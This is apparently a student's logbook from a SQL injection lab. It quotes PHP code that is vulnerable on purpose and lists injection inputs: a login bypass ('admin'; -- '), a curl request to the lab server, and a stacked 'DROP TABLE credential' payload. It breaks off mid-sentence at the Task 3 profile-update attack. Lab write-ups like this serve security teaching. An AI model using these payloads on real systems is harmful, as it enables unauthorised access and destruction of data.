# SQL Injection LogBook

This logbook pretends to documentante the work that was made in the SQL Injection lab, deduce some conclusions, identify the errors that were commited as well as to suggest the mosifications that would make the system secure to this type of attacks.


## Task 2

In this attack, we were presented to the php file that is being ran under the server side

```php
$input_uname = $_GET[’username’];
$input_pwd = $_GET[’Password’];
$hashed_pwd = sha1($input_pwd);
...
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
$result = $conn -> query($sql);


```

### Task 2.1 - Attack from webpage

Considering that we know the code, it is really easy to exploit this vulnerability:

`username: admin'; -- `


`password: <anything> `

This approach works, because the sql statement that will be queried to the database will be partionally connected and, with that, we can enter the system:

```sql
    SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= ’admin’; -- and Password=’<anything>";
```

### Task 2.2 - Attack from command line

After that, the approach that was made was exaclty the same, but in the command line, it will go like this:

```sh
curl ’www.seed-server.com/unsafe_home.php?username=admin%27%20--%20&Password=<anything>’
```

This approach works and the justification is similar to task 2.1

### Task 2.3 - Append a new SQL statement

The next challange is to try to add a new sql statement in the project. Here is a way of how to do that:

`username: admin'; DROP TABLE credential; -- `


`password: <anything> `

This approach will lead to a query like this:

```sql
    SELECT id, name, eid, salary, birth, ssn, address, email,
               nickname, Password
        FROM credential
        WHERE name= ’admin’; DROP TABLE credential; -- and Password=’<anything>";
```

However, this query does not let to drop the table `creentia`. That occurs because the `$conn -> query($sql)` only executes the first query as a protection measure.

## Task 3

Here is the php code that executes the query that will update the database after editing the profile

```php
$hashed_pwd = sha1($input_pwd);
$sql = "UPDATE credential SET
   nickname=’$input_nickname’,
   email=’$input_email’,
   address=’$input_address’,
   Password=’$hashed_pwd’,
   PhoneNumber=’$input_phonenumber’
WHERE ID=$id;";
$conn->query($sql);
```

The form looks like this:



### Task 3 - Modify own salary

To do so, the parameters are 
